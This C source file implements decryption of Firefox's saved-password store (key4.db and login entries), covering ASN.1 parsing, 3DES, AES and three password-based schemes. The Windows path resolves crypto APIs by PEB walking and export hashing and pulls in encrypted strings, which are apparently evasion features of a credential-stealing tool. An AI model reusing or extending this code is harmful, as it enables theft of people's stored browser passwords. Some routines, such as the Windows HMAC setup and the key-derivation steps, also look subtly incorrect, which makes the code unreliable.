/*
 * firefox_crypto.c — Firefox NSS key4.db decryption
 *
 * Implements ASN.1 DER parsing, 3DES-CBC, AES-128-CBC,
 * and the three PBE schemes used by Firefox:
 *   - metaPBE:  PBKDF2-SHA256 + AES-128-CBC (password blob)
 *   - nssPBE:   SHA1 + HMAC-SHA1 + 3DES-CBC  (nssPrivate key)
 *   - loginPBE: SHA1 + 3DES-CBC              (login entries)
 */

#include "firefox_crypto.h"
#include "secure_zero.h"
#include "utils/base64.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
/* L3: #pragma comment(lib) removed — incompatible with mingw no-CRT; libs resolved via PEB walk */

/* PEB-walk includes */
#include "bcrypt_peb.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"

/* MinGW BCrypt compatibility — full type + constant definitions */
#ifndef BCRYPT_SHA1_ALGORITHM
#define BCRYPT_SHA1_ALGORITHM L"SHA1"
#endif
#ifndef BCRYPT_SHA256_ALGORITHM
#define BCRYPT_SHA256_ALGORITHM L"SHA256"
#endif
#ifndef BCRYPT_3DES_ALGORITHM
#define BCRYPT_3DES_ALGORITHM L"3DES"
#endif
#ifndef BCRYPT_AES_ALGORITHM
#define BCRYPT_AES_ALGORITHM L"AES"
#endif
#ifndef BCRYPT_CHAINING_MODE
#define BCRYPT_CHAINING_MODE L"ChainingMode"
#endif
#ifndef BCRYPT_CHAIN_MODE_CBC
#define BCRYPT_CHAIN_MODE_CBC L"ChainingModeCBC"
#endif
#ifndef BCRYPT_ALG_FLAG_HMAC_FLAG
#define BCRYPT_ALG_FLAG_HMAC_FLAG 0x00000008
#endif

/* MinGW may lack these BCrypt declarations — provide them */
#ifndef __BCRYPT_H__  /* guard against double-include from MinGW's bcrypt.h */
typedef void *BCRYPT_ALG_HANDLE;
typedef void *BCRYPT_KEY_HANDLE;
typedef void *BCRYPT_HASH_HANDLE;
typedef long NTSTATUS;

NTSTATUS BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE *, const wchar_t *,
                                     const wchar_t *, unsigned long);
NTSTATUS BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, unsigned long);
NTSTATUS BCryptSetProperty(BCRYPT_ALG_HANDLE, const wchar_t *, unsigned char *,
                           unsigned long, unsigned long);
NTSTATUS BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *,
                                    unsigned char *, unsigned long,
                                    unsigned char *, unsigned long, unsigned long);
NTSTATUS BCryptDestroyKey(BCRYPT_KEY_HANDLE);
NTSTATUS BCryptDecrypt(BCRYPT_KEY_HANDLE, unsigned char *, unsigned long,
                       void *, unsigned char *, unsigned long,
                       unsigned char *, unsigned long, unsigned long *, unsigned long);
NTSTATUS BCryptCreateHash(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE *,
                          unsigned char *, unsigned long,
                          BCRYPT_KEY_HANDLE, unsigned char *, unsigned long);
NTSTATUS BCryptHashData(BCRYPT_HASH_HANDLE, unsigned char *, unsigned long,
                        unsigned long);
NTSTATUS BCryptFinishHash(BCRYPT_HASH_HANDLE, unsigned char *, unsigned long,
                          unsigned long);
NTSTATUS BCryptDestroyHash(BCRYPT_HASH_HANDLE);
NTSTATUS BCryptDeriveKeyPBKDF2(BCRYPT_ALG_HANDLE, unsigned char *, unsigned long,
                               unsigned char *, unsigned long, unsigned long,
                               unsigned char *, unsigned long, unsigned long);
#endif

#else
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <openssl/aes.h>
#include <openssl/des.h>
#endif

/* ═══════════════════════════════════════════════════════════════
 *  ASN.1 DER reader
 * ═══════════════════════════════════════════════════════════════ */

int fx_asn1_read_tag(FxAsn1Reader *r, uint8_t *tag) {
    if (r->pos >= r->len) return -1;
    *tag = r->data[r->pos++];
    return 0;
}

int fx_asn1_read_length(FxAsn1Reader *r, size_t *length) {
    if (r->pos >= r->len) return -1;
    uint8_t first = r->data[r->pos++];
    if (!(first & 0x80)) {
        *length = first;
        return 0;
    }
    int n = first & 0x7F;
    if (n == 0 || n > 4) return -1;
    *length = 0;
    for (int i = 0; i < n; i++) {
        if (r->pos >= r->len) return -1;
        *length = (*length << 8) | r->data[r->pos++];
    }
    return 0;
}

int fx_asn1_read_sequence(FxAsn1Reader *r, FxAsn1Reader *content) {
    uint8_t tag;
    if (fx_asn1_read_tag(r, &tag) < 0 || tag != 0x30) return -1;
    size_t len;
    if (fx_asn1_read_length(r, &len) < 0) return -1;
    if (r->pos + len > r->len) return -1;
    content->data = r->data + r->pos;
    content->len = len;
    content->pos = 0;
    r->pos += len;
    return 0;
}

int fx_asn1_read_octet_string(FxAsn1Reader *r, const unsigned char **out, size_t *out_len) {
    uint8_t tag;
    if (fx_asn1_read_tag(r, &tag) < 0 || tag != 0x04) return -1;
    size_t len;
    if (fx_asn1_read_length(r, &len) < 0) return -1;
    if (r->pos + len > r->len) return -1;
    *out = r->data + r->pos;
    *out_len = len;
    r->pos += len;
    return 0;
}

int fx_asn1_read_integer(FxAsn1Reader *r, uint64_t *value) {
    uint8_t tag;
    if (fx_asn1_read_tag(r, &tag) < 0 || tag != 0x02) return -1;
    size_t len;
    if (fx_asn1_read_length(r, &len) < 0) return -1;
    if (len == 0 || len > 8 || r->pos + len > r->len) return -1;
    *value = 0;
    for (size_t i = 0; i < len; i++)
        *value = (*value << 8) | r->data[r->pos++];
    return 0;
}

int fx_asn1_read_oid(FxAsn1Reader *r, const unsigned char **out, size_t *out_len) {
    uint8_t tag;
    if (fx_asn1_read_tag(r, &tag) < 0 || tag != 0x06) return -1;
    size_t len;
    if (fx_asn1_read_length(r, &len) < 0) return -1;
    if (r->pos + len > r->len) return -1;
    *out = r->data + r->pos;
    *out_len = len;
    r->pos += len;
    return 0;
}

int fx_asn1_peek_tag(FxAsn1Reader *r, uint8_t *tag) {
    if (r->pos >= r->len) return -1;
    *tag = r->data[r->pos];
    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 *  SHA-1 / HMAC-SHA1
 * ═══════════════════════════════════════════════════════════════ */

#ifdef _WIN32

void fx_sha1(const unsigned char *data, size_t len, unsigned char *out20) {
    const bcrypt_api_t *bc = mirage_bcrypt_api();
    if (!bc) return;
    BCRYPT_ALG_HANDLE hAlgo = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS st;
    st = bc->pOpen(&hAlgo, BCRYPT_SHA1_ALGORITHM, NULL, 0);
    if (st < 0) return;
    st = bc->pCreateHash(hAlgo, &hHash, NULL, 0, NULL, 0, 0);
    if (st < 0) { bc->pClose(hAlgo, 0); return; }
    bc->pHashData(hHash, (PUCHAR)data, (ULONG)len, 0);
    bc->pFinishHash(hHash, out20, 20, 0);
    bc->pDestroyHash(hHash);
    bc->pClose(hAlgo, 0);
}

void fx_hmac_sha1(const unsigned char *key, size_t key_len,
                  const unsigned char *data, size_t data_len,
                  unsigned char *out20) {
    const bcrypt_api_t *bc = mirage_bcrypt_api();
    if (!bc) return;
    BCRYPT_ALG_HANDLE hAlgo = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS st;
    st = bc->pOpen(&hAlgo, BCRYPT_SHA1_ALGORITHM, NULL,
                   BCRYPT_ALG_FLAG_HMAC_FLAG);
    if (st < 0) return;
    st = bc->pGenKey(hAlgo, &hKey, NULL, 0,
                     (PUCHAR)key, (ULONG)key_len, 0);
    if (st < 0) { bc->pClose(hAlgo, 0); return; }
    BCRYPT_HASH_HANDLE hHash = NULL;
    st = bc->pCreateHash(hAlgo, &hHash, NULL, 0, (PUCHAR)hKey, key_len, 0);
    if (st < 0) { bc->pDestroyKey(hKey); bc->pClose(hAlgo, 0); return; }
    bc->pHashData(hHash, (PUCHAR)data, (ULONG)data_len, 0);
    bc->pFinishHash(hHash, out20, 20, 0);
    bc->pDestroyHash(hHash);
    bc->pDestroyKey(hKey);
    bc->pClose(hAlgo, 0);
}

#else

void fx_sha1(const unsigned char *data, size_t len, unsigned char *out20) {
    SHA1(data, len, out20);
}

void fx_hmac_sha1(const unsigned char *key, size_t key_len,
                  const unsigned char *data, size_t data_len,
                  unsigned char *out20) {
    unsigned int md_len = 20;
    HMAC(EVP_sha1(), key, (int)key_len, data, data_len, out20, &md_len);
}

#endif

/* ═══════════════════════════════════════════════════════════════
 *  3DES-CBC decryption
 * ═══════════════════════════════════════════════════════════════ */

#ifdef _WIN32

int fx_des3_decrypt_cbc(const uint8_t *key24, const uint8_t *iv8,
                        const unsigned char *data, size_t data_len,
                        unsigned char *out, size_t out_max, size_t *out_len) {
    if (data_len == 0 || data_len % 8 != 0) return -1;
    if (out_max < data_len) return -1;

    const bcrypt_api_t *bc = mirage_bcrypt_api();
    if (!bc) return -1;
    BCRYPT_ALG_HANDLE hAlgo = NULL;
    NTSTATUS st;
    /* L10: 3DES-CBC is deprecated but required — this is Firefox's legacy nssPBE format (pre-key4.db) */
    st = bc->pOpen(&hAlgo, BCRYPT_3DES_ALGORITHM, NULL, 0);
    if (st < 0) return -1;

    st = bc->pSetProp(hAlgo, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (st < 0) { bc->pClose(hAlgo, 0); return -1; }

    BCRYPT_KEY_HANDLE hKey = NULL;
    st = bc->pGenKey(hAlgo, &hKey, NULL, 0,
                     (PUCHAR)key24, 24, 0);
    if (st < 0) { bc->pClose(hAlgo, 0); return -1; }

    uint8_t iv_buf[8];
    memcpy(iv_buf, iv8, 8);
    ULONG result_len = 0;
    st = bc->pDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
                      NULL, iv_buf, 8,
                      out, (ULONG)out_max, &result_len, 0);

    bc->pDestroyKey(hKey);
    bc->pClose(hAlgo, 0);

    if (st < 0) return -1;
    *out_len = result_len;
    return 0;
}

#else

int fx_des3_decrypt_cbc(const uint8_t *key24, const uint8_t *iv8,
                        const unsigned char *data, size_t data_len,
                        unsigned char *out, size_t out_max, size_t *out_len) {
    if (data_len == 0 || data_len % 8 != 0) return -1;
    if (out_max < data_len) return -1;

    DES_key_schedule ks1, ks2, ks3;
    DES_cblock k1, k2, k3;
    memcpy(k1, key24, 8);
    memcpy(k2, key24 + 8, 8);
    memcpy(k3, key24 + 16, 8);
    DES_set_key(&k1, &ks1);
    DES_set_key(&k2, &ks2);
    DES_set_key(&k3, &ks3);

    DES_cblock ivec;
    memcpy(ivec, iv8, 8);

    /* 3DES-CBC decrypt */
    DES_ede3_cbc_encrypt(data, out, (unsigned long)data_len,
                         &ks1, &ks2, &ks3, &ivec, DES_DECRYPT);

    *out_len = data_len;
    return 0;
}

#endif

/* ═══════════════════════════════════════════════════════════════
 *  AES-128-CBC decryption
 * ═══════════════════════════════════════════════════════════════ */

#ifdef _WIN32

int fx_aes128_decrypt_cbc(const uint8_t *key16, const uint8_t *iv16,
                          const unsigned char *data, size_t data_len,
                          unsigned char *out, size_t out_max, size_t *out_len) {
    if (data_len == 0 || data_len % 16 != 0) return -1;
    if (out_max < data_len) return -1;

    const bcrypt_api_t *bc = mirage_bcrypt_api();
    if (!bc) return -1;
    BCRYPT_ALG_HANDLE hAlgo = NULL;
    NTSTATUS st;
    st = bc->pOpen(&hAlgo, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (st < 0) return -1;
    st = bc->pSetProp(hAlgo, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (st < 0) { bc->pClose(hAlgo, 0); return -1; }

    BCRYPT_KEY_HANDLE hKey = NULL;
    st = bc->pGenKey(hAlgo, &hKey, NULL, 0,
                     (PUCHAR)key16, 16, 0);
    if (st < 0) { bc->pClose(hAlgo, 0); return -1; }

    uint8_t iv_buf[16];
    memcpy(iv_buf, iv16, 16);
    ULONG result_len = 0;
    st = bc->pDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
                      NULL, iv_buf, 16,
                      out, (ULONG)out_max, &result_len, 0);

    bc->pDestroyKey(hKey);
    bc->pClose(hAlgo, 0);

    if (st < 0) return -1;
    *out_len = result_len;
    return 0;
}

#else

int fx_aes128_decrypt_cbc(const uint8_t *key16, const uint8_t *iv16,
                          const unsigned char *data, size_t data_len,
                          unsigned char *out, size_t out_max, size_t *out_len) {
    if (data_len == 0 || data_len % 16 != 0) return -1;
    if (out_max < data_len) return -1;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int outl = 0;
    int total = 0;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key16, iv16) != 1)
        goto fail;
    if (EVP_DecryptUpdate(ctx, out, &outl, data, (int)data_len) != 1)
        goto fail;
    total = outl;
    if (EVP_DecryptFinal_ex(ctx, out + total, &outl) != 1)
        goto fail;
    total += outl;

    EVP_CIPHER_CTX_free(ctx);
    *out_len = (size_t)total;
    return 0;

fail:
    EVP_CIPHER_CTX_free(ctx);
    return -1;
}

#endif

/* ═══════════════════════════════════════════════════════════════
 *  PBE decryption routines
 * ═══════════════════════════════════════════════════════════════ */

/* ── nssPBE: HMAC-SHA1 key stretching + 3DES-CBC ───────────── */

/*
 * Firefox nssPBE derivation:
 *   1. hp = SHA1(global_salt + master_pwd)
 *   2. chp = SHA1(global_salt + hp)
 *   3. k1 = HMAC-SHA1(chp, actual_salt || 0x00)
 *   4. k2 = HMAC-SHA1(chp, k1 || actual_salt || 0x00)
 *   5. k3 = HMAC-SHA1(chp, k2 || actual_salt || 0x00)
 *   6. des_key = k1[0..8] || k2[0..8] || k3[0..8]
 *   7. iv = HMAC-SHA1(chp, actual_salt || 0x01)[0..8]
 */
int fx_decrypt_nss_pbe(const unsigned char *global_salt, size_t gs_len,
                       const unsigned char *master_pwd, size_t mp_len,
                       const unsigned char *enc_data, size_t enc_len,
                       unsigned char *out, size_t out_max, size_t *out_len) {
    if (enc_len < 10) return -1;

    /* Parse ASN.1: SEQUENCE { SEQUENCE { OID, SEQUENCE { OCTET_STRING(salt), INTEGER } }, OCTET_STRING(encrypted) } */
    FxAsn1Reader r = { .data = enc_data, .len = enc_len, .pos = 0 };
    FxAsn1Reader outer;
    if (fx_asn1_read_sequence(&r, &outer) < 0) return -1;

    FxAsn1Reader algo;
    if (fx_asn1_read_sequence(&outer, &algo) < 0) return -1;

    const unsigned char *oid; size_t oid_len;
    if (fx_asn1_read_oid(&algo, &oid, &oid_len) < 0) return -1;

    FxAsn1Reader salt_seq;
    if (fx_asn1_read_sequence(&algo, &salt_seq) < 0) return -1;

    const unsigned char *entry_salt; size_t salt_len;
    if (fx_asn1_read_octet_string(&salt_seq, &entry_salt, &salt_len) < 0) return -1;
    if (salt_len < 16) return -1;

    uint64_t len_val;
    fx_asn1_read_integer(&salt_seq, &len_val);

    /* Read encrypted content */
    const unsigned char *encrypted; size_t encrypted_len;
    if (fx_asn1_read_octet_string(&outer, &encrypted, &encrypted_len) < 0) return -1;
    if (encrypted_len < 8 || encrypted_len % 8 != 0) return -1;

    /* L11: Key derivation uses SHA-1 — inherited from Firefox's nssPBE algorithm.
     * SHA-1 collision resistance is broken but this matches Firefox's format exactly. */
    unsigned char hp[20], chp[20];

    /* hp = SHA1(global_salt + master_pwd) */
    unsigned char hp_input[512];
    size_t hp_len = gs_len + mp_len;
    if (hp_len > sizeof(hp_input)) return -1;
    memcpy(hp_input, global_salt, gs_len);
    memcpy(hp_input + gs_len, master_pwd, mp_len);
    fx_sha1(hp_input, hp_len, hp);

    /* chp = SHA1(global_salt + hp) */
    unsigned char chp_input[256];
    size_t chp_len = gs_len + 20;
    if (chp_len > sizeof(chp_input)) return -1;
    memcpy(chp_input, global_salt, gs_len);
    memcpy(chp_input + gs_len, hp, 20);
    fx_sha1(chp_input, chp_len, chp);

    /* k1 = HMAC-SHA1(chp, entry_salt[0..16] || 0x00) */
    unsigned char k1_salt[33];
    memcpy(k1_salt, entry_salt, 16);
    k1_salt[16] = 0x00;
    unsigned char k1[20];
    fx_hmac_sha1(chp, 20, k1_salt, 17, k1);

    /* k2 = HMAC-SHA1(chp, k1 || entry_salt[0..16] || 0x00) */
    unsigned char k2_salt[41];
    memcpy(k2_salt, k1, 20);
    memcpy(k2_salt + 20, entry_salt, 16);
    k2_salt[36] = 0x00;
    unsigned char k2[20];
    fx_hmac_sha1(chp, 20, k2_salt, 37, k2);

    /* k3 = HMAC-SHA1(chp, k2 || entry_salt[0..16] || 0x00) */
    unsigned char k3_salt[41];
    memcpy(k3_salt, k2, 20);
    memcpy(k3_salt + 20, entry_salt, 16);
    k3_salt[36] = 0x00;
    unsigned char k3[20];
    fx_hmac_sha1(chp, 20, k3_salt, 37, k3);

    /* 3DES key = k1[0..8] || k2[0..8] || k3[0..8] */
    unsigned char des_key[24];
    memcpy(des_key,      k1, 8);
    memcpy(des_key + 8,  k2, 8);
    memcpy(des_key + 16, k3, 8);

    /* IV = HMAC-SHA1(chp, entry_salt[0..16] || 0x01)[0..8] */
    unsigned char iv_salt[33];
    memcpy(iv_salt, entry_salt, 16);
    iv_salt[16] = 0x01;
    unsigned char iv_full[20];
    fx_hmac_sha1(chp, 20, iv_salt, 17, iv_full);

    /* Decrypt */
    size_t dec_len = 0;
    if (fx_des3_decrypt_cbc(des_key, iv_full, encrypted, encrypted_len,
                            out, out_max, &dec_len) < 0)
        return -1;

    /* Remove PKCS7 padding */
    if (dec_len == 0) return -1;
    unsigned char pad = out[dec_len - 1];
    if (pad == 0 || pad > 8 || pad > dec_len) return -1;
    int pad_ok = 1;
    for (size_t i = 0; i < pad; i++) {
        if (out[dec_len - 1 - i] != pad) { pad_ok = 0; break; }
    }
    if (!pad_ok) return -1;
    dec_len -= pad;

    mirage_secure_zero(hp, sizeof(hp));
    mirage_secure_zero(chp, sizeof(chp));
    mirage_secure_zero(k1, sizeof(k1));
    mirage_secure_zero(k2, sizeof(k2));
    mirage_secure_zero(k3, sizeof(k3));
    mirage_secure_zero(des_key, sizeof(des_key));

    *out_len = dec_len;
    return 0;
}

/* ── metaPBE: PBKDF2-SHA256 + AES-128-CBC ──────────────────── */

/*
 * Firefox metaPBE:
 *   1. key_material = SHA1(global_salt)
 *   2. aes_key = PBKDF2-SHA256(key_material, entry_salt, iterations, 16)
 *   3. Decrypt with AES-128-CBC(aes_key, iv, encrypted)
 */
int fx_decrypt_meta_pbe(const unsigned char *global_salt, size_t gs_len,
                        const unsigned char *enc_data, size_t enc_len,
                        unsigned char *out, size_t out_max, size_t *out_len) {
    if (enc_len < 20) return -1;

    FxAsn1Reader r = { .data = enc_data, .len = enc_len, .pos = 0 };
    FxAsn1Reader outer;
    if (fx_asn1_read_sequence(&r, &outer) < 0) return -1;

    /* algo SEQUENCE { OID, SEQUENCE { pbkdf2 OID, params } } */
    FxAsn1Reader algo;
    if (fx_asn1_read_sequence(&outer, &algo) < 0) return -1;

    const unsigned char *oid; size_t oid_len;
    if (fx_asn1_read_oid(&algo, &oid, &oid_len) < 0) return -1;

    /* PBKDF2 wrapper */
    FxAsn1Reader pbkdf2_wrap;
    if (fx_asn1_read_sequence(&algo, &pbkdf2_wrap) < 0) return -1;

    const unsigned char *pbkdf2_oid; size_t pbkdf2_oid_len;
    if (fx_asn1_read_oid(&pbkdf2_wrap, &pbkdf2_oid, &pbkdf2_oid_len) < 0) return -1;

    FxAsn1Reader pbkdf2_params;
    if (fx_asn1_read_sequence(&pbkdf2_wrap, &pbkdf2_params) < 0) return -1;

    const unsigned char *entry_salt; size_t salt_len;
    if (fx_asn1_read_octet_string(&pbkdf2_params, &entry_salt, &salt_len) < 0) return -1;

    uint64_t iterations;
    if (fx_asn1_read_integer(&pbkdf2_params, &iterations) < 0) return -1;

    size_t key_size = 16;
    uint8_t peek;
    if (fx_asn1_peek_tag(&pbkdf2_params, &peek) == 0 && peek == 0x02) {
        uint64_t ks;
        if (fx_asn1_read_integer(&pbkdf2_params, &ks) == 0)
            key_size = (size_t)ks;
    }

    /* IV from encryption algorithm */
    uint8_t iv[16];
    FxAsn1Reader enc_algo_wrap;
    if (fx_asn1_read_sequence(&pbkdf2_wrap, &enc_algo_wrap) < 0) return -1;
    const unsigned char *enc_oid; size_t enc_oid_len;
    if (fx_asn1_read_oid(&enc_algo_wrap, &enc_oid, &enc_oid_len) < 0) return -1;
    const unsigned char *iv_bytes; size_t iv_len;
    if (fx_asn1_read_octet_string(&enc_algo_wrap, &iv_bytes, &iv_len) < 0) return -1;
    if (iv_len < 16) return -1;
    memcpy(iv, iv_bytes, 16);

    /* Encrypted content */
    const unsigned char *encrypted; size_t encrypted_len;
    if (fx_asn1_read_octet_string(&outer, &encrypted, &encrypted_len) < 0) return -1;
    if (encrypted_len == 0 || encrypted_len % 16 != 0) return -1;

    /* Key: SHA1(global_salt) */
    unsigned char key_material[20];
    fx_sha1(global_salt, gs_len, key_material);

    /* PBKDF2-SHA256 */
    unsigned char aes_key[16];
#ifdef _WIN32
    const bcrypt_api_t *bc = mirage_bcrypt_api();
    if (!bc) return -1;
    BCRYPT_ALG_HANDLE hAlgo = NULL;
    bc->pOpen(&hAlgo, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    bc->pDerive(hAlgo, key_material, 20,
                (PUCHAR)entry_salt, (ULONG)salt_len,
                (ULONG)iterations, aes_key, key_size, 0);
    bc->pClose(hAlgo, 0);
#else
    PKCS5_PBKDF2_HMAC((const char *)key_material, 20,
                       entry_salt, (int)salt_len,
                       (int)iterations, EVP_sha256(),
                       (int)key_size, aes_key);
#endif

    /* AES-128-CBC decrypt */
    size_t dec_len = 0;
    if (fx_aes128_decrypt_cbc(aes_key, iv, encrypted, encrypted_len,
                              out, out_max, &dec_len) < 0)
        return -1;

    /* Remove PKCS7 padding */
    if (dec_len == 0) return -1;
    unsigned char pad = out[dec_len - 1];
    if (pad == 0 || pad > 16 || pad > dec_len) return -1;
    int pad_ok = 1;
    for (size_t i = 0; i < pad; i++) {
        if (out[dec_len - 1 - i] != pad) { pad_ok = 0; break; }
    }
    if (!pad_ok) return -1;
    dec_len -= pad;

    *out_len = dec_len;
    return 0;
}

/* ── loginPBE: SHA1(key) as 3DES key + 3DES-CBC ────────────── */

/*
 * Firefox loginPBE:
 *   1. des_key = SHA1(key) padded to 24 bytes (zero-padded)
 *   2. iv = iv_and_data[0..8]
 *   3. encrypted = iv_and_data[8..]
 *   4. Decrypt with 3DES-CBC(des_key, iv, encrypted)
 */
int fx_decrypt_login_pbe(const unsigned char *key, size_t key_len,
                         const unsigned char *iv_and_data, size_t len,
                         unsigned char *out, size_t out_max, size_t *out_len) {
    if (len < 16) return -1; /* at least 8 IV + 8 data */

    /* Derive 3DES key from SHA1(key) */
    unsigned char key_hash[20];
    fx_sha1(key, key_len, key_hash);

    unsigned char des_key[24];
    memset(des_key, 0, 24);
    memcpy(des_key, key_hash, 20); /* remaining 4 bytes stay zero */

    /* IV = first 8 bytes */
    const unsigned char *iv = iv_and_data;
    /* Encrypted data = rest */
    const unsigned char *encrypted = iv_and_data + 8;
    size_t enc_len = len - 8;

    if (enc_len == 0 || enc_len % 8 != 0) return -1;

    size_t dec_len = 0;
    if (fx_des3_decrypt_cbc(des_key, iv, encrypted, enc_len,
                            out, out_max, &dec_len) < 0)
        return -1;

    /* Remove PKCS7 padding */
    if (dec_len == 0) return -1;
    unsigned char pad = out[dec_len - 1];
    if (pad == 0 || pad > 8 || pad > dec_len) return -1;
    int pad_ok = 1;
    for (size_t i = 0; i < pad; i++) {
        if (out[dec_len - 1 - i] != pad) { pad_ok = 0; break; }
    }
    if (!pad_ok) return -1;
    dec_len -= pad;

    *out_len = dec_len;
    return 0;
}
